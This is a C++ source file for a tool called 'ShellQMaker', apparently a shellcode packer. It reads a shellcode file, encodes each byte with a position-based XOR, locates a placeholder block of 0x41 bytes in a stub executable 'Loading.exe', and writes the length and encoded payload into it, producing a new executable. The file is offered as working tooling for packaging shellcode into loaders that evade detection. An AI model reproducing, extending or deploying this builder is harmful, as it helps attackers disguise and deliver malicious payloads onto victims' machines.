#pragma once 
#include "wx/wxprec.h"
#include <cstdlib>
#include "ShellQMaker.h"

using namespace std;




int main(int argc, char* argv[], char* envp[])
{
	wxPrintf("  _________.__           .__  .__   ________      _____          __                  \r\n");
	wxPrintf(" /   _____/|  |__   ____ |  | |  |  \\_____  \\    /     \\ _____  |  | __ ___________  \r\n");
	wxPrintf(" \\_____  \\ |  |  \\_/ __ \\|  | |  |   /  / \\  \\  /  \\ /   \\__  \\ |  |/ // __ \\_  __ \\ \r\n");
	wxPrintf(" /        \\|   Y  \\  ___/|  |_|  |__/   \\_/.  \\/    Y    \\/ __ \\|    <\\  ___/|  | \\/ \r\n");
	wxPrintf("/_______  /|___|  /\\___  >____/____/\\_____\\ \\_/\\____|__  (____  /__|_ \\___  >__ |    \r\n");
	wxPrintf("        \\/      \\/     \\/                  \\__>        \\/     \\/     \\/    \\/        \r\n");
	wxPrintf("\n");
	wxPrintf(" ShellQMaker v1.0 | 2023\n\n");

	if (argc == 3)
	{

		FILEINFO shellcode = OpenfileA(argv[1]);
		for (int i = 0; i < shellcode.size; i++)
		{
			shellcode.pbufr[i] = (shellcode.pbufr[i] ^ (i + 1)) + 1;
		}

		char loadername[] = "Loading.exe";
		FILEINFO Shellload = OpenfileA(loadername);
		//获取Loading中shellcode的地址
		//char Shellload[]={ 0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,};
		int cnt = 0, offset = 0, num = 0;
		while (TRUE)
		{
			if (Shellload.pbufr[cnt] == 0x41)
			{
				offset = cnt;
				while (Shellload.pbufr[cnt] == 0x41)
				{
					cnt++;
					num++;
					if (num > 0x42)
					{
						break;
					}
				}
			}
			if (num > 0x42)
			{
				break;
			}
			cnt++;
			num = 0, offset = 0;
		}
		MMcpy(&(Shellload.pbufr[offset]), &(shellcode.size), sizeof(DWORD));
		MMcpy(&(Shellload.pbufr[offset + sizeof(DWORD)]), shellcode.pbufr, shellcode.size);
		Writetofile(Shellload.pbufr, Shellload.size, argv[2]);
		wxPrintf("\r\n[+] Out ShellFile----->%s\r\n", argv[2]);
		
	}
	else
	{

		wxPrintf("[+] usage:\r\n");
		wxPrintf("[+] ShellQMaker.exe \"dwnload.dat\"  \"outfile.exe\" \r\n");
		wxPrintf("[+] example:\r\n");
		wxPrintf("[+] ShellQMaker.exe download.dat shellcode.exe \r\n");
	}
	return 0;
}
